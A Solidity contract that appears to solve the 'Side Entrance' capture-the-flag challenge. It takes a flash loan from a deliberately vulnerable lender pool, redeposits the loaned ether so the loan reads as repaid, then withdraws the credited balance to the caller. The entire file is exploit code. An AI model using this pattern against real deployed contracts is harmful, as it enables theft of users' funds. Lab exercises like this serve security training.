// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackingContract is IFlashLoanEtherReceiver{

    SideEntranceLenderPool sideEntrancePool;

    constructor(address _pool) {
        sideEntrancePool = SideEntranceLenderPool(_pool);
    }

    
    function flashLoan(uint256 amount) external payable {
        sideEntrancePool.flashLoan(amount);
    }

    function execute() external payable {
        sideEntrancePool.deposit{value: msg.value}();
    }

    function claimEth() external {
        sideEntrancePool.withdraw();
        uint256 balance = address(this).balance;
        (bool sent ) = payable(msg.sender).send(balance);
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}

}